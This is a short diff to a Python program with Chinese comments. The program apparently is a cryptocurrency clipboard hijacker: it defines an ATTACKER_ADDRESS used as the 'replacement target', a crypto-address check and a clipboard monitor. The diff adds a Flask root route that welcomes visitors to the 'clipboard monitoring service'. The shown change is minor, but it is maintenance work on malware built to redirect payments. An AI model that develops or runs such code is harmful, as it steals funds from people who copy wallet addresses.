@@ -7,6 +7,7 @@ import threading
 # 替换的目标目标地址
 ATTACKER_ADDRESS = "panteklu"
 
+
 def is_crypto_address(address):
     """
     判断给定地址是否为加密货币地址。
@@ -58,6 +59,14 @@ def monitor_clipboard():
 
 # Flask Web服务
 app = Flask(__name__)
+
+@app.route('/', methods=['GET'])
+def home():
+    """
+    根路径响应，避免出现 404 错误。
+    """
+    return 'Welcome to the clipboard monitoring service!', 200
+
 
 @app.route('/trigger', methods=['GET'])
 def trigger():
